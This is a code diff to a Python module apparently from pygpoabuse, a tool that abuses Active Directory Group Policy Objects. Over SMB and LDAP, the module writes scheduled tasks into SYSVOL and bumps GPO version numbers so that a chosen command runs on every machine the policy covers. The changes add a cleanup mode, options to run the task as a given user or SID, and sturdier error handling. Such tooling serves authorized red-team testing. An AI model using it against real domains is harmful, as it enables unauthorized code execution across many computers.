@@ -2,8 +2,10 @@ import asyncio
 import logging
 import re
 from pygpoabuse.scheduledtask import ScheduledTask
+from pygpoabuse.extension_names import remove_scheduled_task_extensions
 from pygpoabuse.ldap import Ldap
 from impacket.smbconnection import SessionError
+from impacket.nt_errors import STATUS_NO_SUCH_FILE, STATUS_OBJECT_NAME_NOT_FOUND, STATUS_OBJECT_PATH_NOT_FOUND
 
 
 class GPO:
@@ -17,6 +19,9 @@ class GPO:
 
         if extensionName is None:
             extensionName = ""
+
+        if val2 in ''.join(extensionName):
+            return ''.join(extensionName)
 
         try:
             if not val2 in extensionName:
@@ -77,7 +82,7 @@ class GPO:
         except:
             return "[{" + val1 + "}{" + val2 + "}]" + "[{" + val3 + "}{" + val2 + "}]"
 
-    async def update_ldap(self, url, domain, gpo_id, gpo_type="computer"):
+    async def update_ldap(self, url, domain, gpo_id, gpo_type="computer", cleanup=False):
         ldap = Ldap(url, gpo_id, domain)
         r = await ldap.connect()
         if not r:
@@ -85,6 +90,9 @@ class GPO:
             return False
 
         version = await ldap.get_attribute("versionNumber")
+        if not isinstance(version, int):
+            logging.error("Could not read the GPO versionNumber from Active Directory")
+            return False
         
         if gpo_type == "computer":
             attribute_name = "gPCMachineExtensionNames"
@@ -96,22 +104,35 @@ class GPO:
         extensionName = await ldap.get_attribute(attribute_name)
 
         if extensionName == False:
-            logging.debug("Could not get {} attribute".format(attribute_name))
+            logging.error("Could not read %s from Active Directory", attribute_name)
             return False
 
-        updated_extensionName = self.update_extensionNames(extensionName)
+        try:
+            updated_extensionName = (remove_scheduled_task_extensions(extensionName)
+                                     if cleanup else self.update_extensionNames(extensionName))
+        except ValueError as e:
+            logging.error("Could not parse GPO extension names: %s", e)
+            return False
 
         logging.debug("New extensionName: {}".format(updated_extensionName))
 
-        await ldap.update_attribute(attribute_name, updated_extensionName, extensionName)
-        await ldap.update_attribute("versionNumber", updated_version, version)
+        current_extensionName = "".join(extensionName) if isinstance(extensionName, (list, tuple)) else extensionName
+        if updated_extensionName != current_extensionName:
+            if cleanup and not updated_extensionName:
+                if not await ldap.clear_attribute(attribute_name):
+                    return False
+            elif not await ldap.update_attribute(attribute_name, updated_extensionName, extensionName):
+                return False
+        if not await ldap.update_attribute("versionNumber", updated_version, version):
+            return False
 
         return updated_version
 
-    def update_versions(self, url, domain, gpo_id, gpo_type):
-        updated_version = asyncio.run(self.update_ldap(url, domain, gpo_id, gpo_type))
+    def update_versions(self, url, domain, gpo_id, gpo_type, cleanup=False):
+        updated_version = asyncio.run(self.update_ldap(url, domain, gpo_id, gpo_type, cleanup=cleanup))
 
         if not updated_version:
+            logging.error("Could not update the GPO version in Active Directory")
             return False
 
         logging.debug("Updated version number : {}".format(updated_version))
@@ -149,7 +170,7 @@ class GPO:
                     return False
         return True
 
-    def update_scheduled_task(self, domain, gpo_id, name="", mod_date="", description="", powershell=False, command="", gpo_type="computer", computername="",force=False):
+    def update_scheduled_task(self, domain, gpo_id, name="", mod_date="", description="", powershell=False, command="", gpo_type="computer", computername="", force=False, username="", usersid=""):
 
         try:
             tid = self._smb_session.connectTree("SYSVOL")
@@ -183,7 +204,8 @@ class GPO:
             fid = self._smb_session.openFile(tid, path)
             st_content = self._smb_session.readFile(tid, fid, singleCall=False).decode("utf-8")
             st = ScheduledTask(gpo_type=gpo_type, name=name, mod_date=mod_date, description=description,
-                               powershell=powershell, command=command, old_value=st_content, computername=computername)
+                               powershell=powershell, command=command, old_value=st_content, computername=computername,
+                               username=username, usersid=usersid)
             tasks = st.parse_tasks(st_content)
 
             if not force:
@@ -205,7 +227,7 @@ class GPO:
             except:
                 logging.error("This user doesn't seem to have the necessary rights", exc_info=True)
                 return False
-            st = ScheduledTask(gpo_type=gpo_type, name=name, mod_date=mod_date, description=description, powershell=powershell, command=command, computername=computername)
+            st = ScheduledTask(gpo_type=gpo_type, name=name, mod_date=mod_date, description=description, powershell=powershell, command=command, computername=computername, username=username, usersid=usersid)
             new_content = st.generate_scheduled_task_xml()
 
         try:
@@ -233,7 +255,10 @@ class GPO:
             self._smb_session.deleteFile(share, xml)
             logging.info(f"Deleted {xml}")
         except SessionError as e:
-            logging.error(f"XML delete failed: {e}")
-            return False
+            if e.getErrorCode() in (STATUS_NO_SUCH_FILE, STATUS_OBJECT_NAME_NOT_FOUND, STATUS_OBJECT_PATH_NOT_FOUND):
+                logging.info("ScheduledTasks.xml is already absent")
+            else:
+                logging.error(f"XML delete failed: {e}")
+                return False
 
         return True
